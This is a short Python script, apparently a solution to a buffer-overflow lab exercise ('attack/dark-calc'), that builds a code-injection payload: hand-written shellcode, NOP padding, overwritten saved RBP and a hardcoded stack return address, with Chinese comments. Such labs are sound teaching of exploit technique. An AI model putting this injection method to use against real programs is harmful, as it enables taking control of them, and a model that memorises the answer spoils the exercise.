#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc."""
import sys

# 栈上机器码：mov edi,4; push 0x401a87; ret
# 缓冲区地址到0x401a87的位移超出32位，所以用push imm32;ret代替call rel32
code  = b"\xbf\x04\x00\x00\x00"
code += b"\x68\x87\x1a\x40\x00"
code += b"\xc3"

# 机器码放进16字节缓冲区并用NOP补齐，之后覆盖saved RBP和返回地址
payload  = code + b"\x90" * (16 - len(code))
payload += b"B" * 8
payload += b"\xd0\x0f\x80\x00\x10\x72\x00\x00"
payload += b"\n"

sys.stdout.buffer.write(payload)
